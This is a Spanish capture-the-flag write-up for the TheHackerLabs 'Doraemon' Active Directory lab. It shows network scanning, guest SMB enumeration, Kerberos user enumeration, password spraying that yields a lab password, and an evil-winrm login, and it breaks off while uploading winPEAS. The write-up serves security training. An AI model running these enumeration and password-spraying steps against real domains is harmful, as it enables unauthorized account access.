---
title: "Doraemon - TheHackerLabs"
date: 2025-04-09
draft: false
slug: "THL-writeup-doraemon"
excerpt: "Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es Active Directory, vemos que es posible ver los recursos compartidos con el usuario guest. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de Doraemon. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar Password Spraying con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al servicio WinRM, lo que nos permite loguearnos con la herramienta Evil-WinRM. Una vez dentro, utilizamos winPEASx64.exe para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar Password Spraying y lo encontramos, siendo que también pertenece al servicio WinRM. Logueándonos con el nuevo usuario, descubrimos que pertenece al grupo DNSAdmins, lo que nos permite crear y cargar una Reverse Shell almacenada en un archivo DLL, con tal de infectar el servicio DNS y nos permita escalar privilegios en otra sesión que capturara la Reverse Shell."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "Active Directory", "SMB", "Kerberos", "SMB Enumeration", "Kerberos Enumeration", "Password Spraying Attack", "System Recognition (Windows)", "Abusing DNSAdmins Group", "Privesc - Abusing DNSAdmins Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "crackmapexec"
  - "smbmap"
  - "kerbrute_linux_amd64"
  - "impacket-GetNPUsers"
  - "evil-winrm"
  - "winPEASx64.exe"
  - "whoami"
  - "msfvenom"
  - "impacket-smbserver"
  - "rlwrap"
  - "nc"
  - "dnscmd.exe"
  - "sc.exe"
links:
  - "https://github.com/ropnop/kerbrute"
  - "https://github.com/peass-ng/PEASS-ng/tree/master"
  - "https://github.com/61106960/adPEAS/tree/main"
  - "https://github.com/SpecterOps/BloodHound"
  - "https://github.com/SpecterOps/SharpHound"
  - "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"
  - "https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/"
  - "https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b"
  - "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmins#dnsadmins"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-doraemon/doraemon.jpg"
---

<p align="center">
<img src="/assets/images/THL-writeup-doraemon/Captura3.png">
</p>

------------

Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es **Active Directory**, vemos que es posible ver los recursos compartidos con el **usuario guest**. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de **Doraemon**. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar **Password Spraying** con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al **servicio WinRM**, lo que nos permite loguearnos con la herramienta **Evil-WinRM**. Una vez dentro, utilizamos **winPEASx64.exe** para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar **Password Spraying** y lo encontramos, siendo que también pertenece al **servicio WinRM**. Logueándonos con el nuevo usuario, descubrimos que pertenece al **grupo DNSAdmins**, lo que nos permite crear y cargar una **Reverse Shell** almacenada en un **archivo DLL**, con tal de infectar el **servicio DNS** y nos permita escalar privilegios en otra sesión que capturara la **Reverse Shell**.

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.10.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 14:06 CST
Nmap scan report for 192.168.10.5
Host is up (0.0040s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
...
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.47 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.10.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.10.5	XX	PCS Systemtechnik GmbH
...

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.108 seconds (121.44 hosts/sec). 3 responded
```
Encontramos nuestro objetivo y es: `192.168.10.5`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.5
PING 192.168.10.5 (192.168.10.5) 56(84) bytes of data.
64 bytes from 192.168.10.5: icmp_seq=1 ttl=128 time=1.09 ms
64 bytes from 192.168.10.5: icmp_seq=2 ttl=128 time=1.10 ms
64 bytes from 192.168.10.5: icmp_seq=3 ttl=128 time=0.903 ms
64 bytes from 192.168.10.5: icmp_seq=4 ttl=128 time=0.919 ms

--- 192.168.10.5 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3181ms
rtt min/avg/max/mdev = 0.903/1.003/1.104/0.093 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.5 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 14:08 CST
Initiating ARP Ping Scan at 14:08
Scanning 192.168.10.5 [1 port]
Completed ARP Ping Scan at 14:08, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:08
Scanning 192.168.10.5 [65535 ports]
Discovered open port 445/tcp on 192.168.10.5
Discovered open port 139/tcp on 192.168.10.5
Discovered open port 53/tcp on 192.168.10.5
Discovered open port 135/tcp on 192.168.10.5
Discovered open port 593/tcp on 192.168.10.5
Discovered open port 49665/tcp on 192.168.10.5
Discovered open port 49671/tcp on 192.168.10.5
Discovered open port 389/tcp on 192.168.10.5
Discovered open port 47001/tcp on 192.168.10.5
Discovered open port 49668/tcp on 192.168.10.5
Discovered open port 9389/tcp on 192.168.10.5
Discovered open port 49664/tcp on 192.168.10.5
Discovered open port 3269/tcp on 192.168.10.5
Discovered open port 49673/tcp on 192.168.10.5
Discovered open port 49670/tcp on 192.168.10.5
Discovered open port 636/tcp on 192.168.10.5
Discovered open port 49666/tcp on 192.168.10.5
Discovered open port 49708/tcp on 192.168.10.5
Discovered open port 49686/tcp on 192.168.10.5
Discovered open port 49676/tcp on 192.168.10.5
Discovered open port 464/tcp on 192.168.10.5
Discovered open port 49669/tcp on 192.168.10.5
Discovered open port 3268/tcp on 192.168.10.5
Discovered open port 88/tcp on 192.168.10.5
Discovered open port 5985/tcp on 192.168.10.5
Completed SYN Stealth Scan at 14:09, 21.82s elapsed (65535 total ports)
Nmap scan report for 192.168.10.5
Host is up, received arp-response (0.00099s latency).
Scanned at 2025-04-09 14:08:55 CST for 21s
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49686/tcp open  unknown          syn-ack ttl 128
49708/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.07 seconds
           Raw packets sent: 80225 (3.530MB) | Rcvd: 65537 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Son bastantes puertos abiertos, y puedo ver algunos conocidos que nos indican que estamos contra una **Active Directory**, como el **puerto 88**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49673,49676,49686,49708 192.168.10.5 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 14:10 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.10.5
Host is up (0.00085s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-09 12:10:40Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Domain name: DORAEMON.THL
|   Forest name: DORAEMON.THL
|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL
|_  System time: 2025-04-09T14:11:34+02:00
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-04-09T12:11:34
|_  start_date: 2025-04-09T11:59:21
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -8h40m01s, deviation: 1h09m16s, median: -8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.38 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

En efecto, estamos contra una máquina **Active Directory**. Podemos ver el dominio del AD, siendo **DORAEMON.THL**, así que regístralo en el `/etc/hosts`.

Además, vemos que el **servicio SMB** está aceptando el **usuario guest** como autenticación. Entonces, vamos a empezar por el **servicio SMB** para ver que podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio SMB {#SMB}

Veamos qué nos reporta la herramienta **crackmapexec**:
```bash
crackmapexec smb 192.168.10.5
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True)
```
Confirmamos el dominio, la versión del SO que se está usando y que son necesarias credenciales de acceso para loguearse al **servicio SMB**.

Veamos si podemos ver los recursos compartidos con el **usuario guest**, como lo menciono el escaneo:
```bash
smbmap -H 192.168.10.5 -u 'guest' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.10.5:445	Name: DORAEMON.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	gorrocoptero                                      	READ ONLY	
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```
Funciona.

Veamos qué hay dentro del directorio **gorrocoptero**:
```bash
smbmap -H 192.168.10.5 -u 'guest' -r gorrocoptero --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.10.5:445	Name: DORAEMON.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	gorrocoptero                                      	READ ONLY	
	./gorrocoptero
	dr--r--r--                0 Wed Oct  2 03:17:24 2024	.
	dr--r--r--                0 Wed Oct  2 03:17:24 2024	..
	fr--r--r--             1843 Wed Oct  2 03:18:00 2024	kedadawapa.txt
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```
Tenemos un archivo de texto.

Vamos a descargarlo:
```bash
smbmap -H 192.168.10.5 -u 'guest' --download gorrocoptero/kedadawapa.txt --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[+] Starting download: gorrocoptero\kedadawapa.txt (1843 bytes)
[+] File output to: /home/berserkwings/Escritorio/TheHackersLabs/Doraemon/content/192.168.10.5-gorrocoptero_kedadawapa.txt
[*] Closed 1 connections
```

Y veamos su contenido:
```bash
cat 192.168.10.5-gorrocoptero_kedadawapa.txt
Atención al grupo especial Dorayaki1 de Estepona

- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?

- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?

- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!

- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!

- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!

- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.

- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦

- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!

- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.

- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!

- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!

- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.

- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!

- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!

- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!

- Doraemon: Â¡A comer dorayakis!
```
Ok, podemos ignorar los mensajes que se están mandando y enfoquemonos en los nombres del mensaje.

Los guardaremos en un archivo, quedando de esta manera:
```bash
cat AD_users.txt
administrador
guest
invitado
Nobita
Shizuka
Suneo
Gigante
Doraemon
Dorayaki1
Estepona
```
Agregue algunos usuarios conocidos que son por defecto.

Con esto, podemos hacer algunas cosillas.

### Enumeración de Usuarios de Servicio Kerberos {#Kerberos}

La idea es identificar a los usuarios que están registrados en la máquina víctima, y eso lo podemos hacer con la herramienta **Kerbrute**.

Aquí la puedes obtener:
* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>

Veamos cuáles existen:
```bash
./kerbrute_linux_amd64 userenum -d DORAEMON.THL --dc 192.168.10.5 AD_users.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/09/25 - Ronnie Flathers @ropnop

2025/04/09 17:50:18 >  Using KDC(s):
2025/04/09 17:50:18 >  	192.168.10.5:88

2025/04/09 17:50:18 >  [+] VALID USERNAME:	 Shizuka@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 administrador@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 Suneo@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 invitado@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 Doraemon@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 Nobita@DORAEMON.THL
2025/04/09 17:50:18 >  [+] VALID USERNAME:	 Gigante@DORAEMON.THL
2025/04/09 17:50:18 >  Done! Tested 10 usernames (7 valid) in 0.054 seconds
```
Excelente, los únicos usuarios que no existen son **Dorayaki1 y Estepona**.

Ahora bien, podríamos intentar aplicar el **ataque AS-REP Roasting**, pero no funcionará:
```bash
impacket-GetNPUsers -no-pass -usersfile AD_users.txt DORAEMON.THL/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User invitado doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nobita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User suneo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gigante doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Ningún usuario tiene activo el permiso **UF_DONT_REQUIRE_PREAUTH**.

Lo que sí podemos probar, es si algún usuario utilizo su mismo nombre como contraseña y podemos utilizar los que ya tenemos, siendo este el **ataque Password Spraying**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Password Spraying con crackmapexec {#PasswordS}

Aplicaremos **Password Spraying** con **crackmapexec** y escogeremos cada usuario de la lista de usuarios.

Observa que con el nombre del **grupo Dorayaki1**, sirve para algunos usuarios, pero el que me llama la atención es el **usuario Doraemon**:
```bash
crackmapexec smb 192.168.10.5 -u AD_users.txt -p 'Dorayaki1' --continue-on-success --no-brute
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True)
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\administrador:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\guest:Dorayaki1 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\invitado:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:Dorayaki1 STATUS_LOGON_FAILURE 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Dorayaki1:Dorayaki1 
SMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Estepona:Dorayaki1
```
Y recordando el escaneo, vimos que está activo el **servicio WinRM**.

Probemos si funciona esta contraseña contra algún usuario:
```bash
crackmapexec winrm 192.168.10.5 -u AD_users.txt -p 'Dorayaki1' --continue-on-success --no-brute
SMB         192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
HTTP        192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] http://192.168.10.5:5985/wsman
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\administrador:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\guest:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\invitado:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Nobita:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Shizuka:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Suneo:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Gigante:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Doraemon:Dorayaki1 (Pwn3d!)
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Dorayaki1:Dorayaki1
WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\Estepona:Dorayaki1
```
Genial, podemos loguearnos con el **usuario Doraemon** al **servicio WinRM**.

Hagámoslo con la herramienta **evil-winrm**:
```batch
evil-winrm -i 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Doraemon\Documents> whoami
doraemon\doraemon
```
Estamos dentro.

### Enumeración de Máquina Víctima con winPEASx64.exe {#Doraemon}

Dentro de este usuario, aún no encontraremos la flag del usuario y tampoco encontraremos algo dentro de sus directorios.

Revisando sus privilegios, no tendrá alguno del que nos podamos aprovechar:
```batch
*Evil-WinRM* PS C:\Users\Doraemon\Documents> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```

También podemos ver a qué grupos pertenece nuestro usuario:
```batch
*Evil-WinRM* PS C:\Users\Doraemon\Documents> whoami /groups

INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                                                    Tipo           SID          Atributos
================================================================== ============== ============ ========================================================================
Todos                                                              Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                                                   Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
```
No veo algún grupo del que nos podamos aprovechar.

Vamos a subir **winPEASx64** para ver que puede encontrar.

Puedes descargarlo aquí:
* <a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Súbelo a la sesión de **evil-winrm** (recuerda que puedes abrir la sesión donde tengas el **winPEASx64**, si no tendrás que especificar la ruta completa de donde está):
```batch
*Evil-WinRM* PS C:\Users\Doraemon\Documents> cd C:\
*Evil-WinRM* PS C:\> mkdir Temp
